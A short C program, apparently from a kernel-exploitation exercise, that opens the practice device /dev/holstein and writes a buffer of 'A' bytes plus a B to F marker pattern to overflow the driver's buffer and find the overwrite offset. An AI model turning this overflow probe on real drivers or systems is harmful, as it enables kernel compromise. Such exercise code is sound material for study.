#include <fcntl.h>
#include <string.h>
#include <unistd.h>

int main() {
  int fd = open("/dev/holstein", O_RDWR);
  char buf[0x420];
  memset(buf, 'A', 0x400);
  char probe[] = "BBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFF";
  memcpy(buf + 0x400, probe, strlen(probe));
  write(fd, buf, 0x400 + strlen(probe));
  close(fd);
  return 0;
}
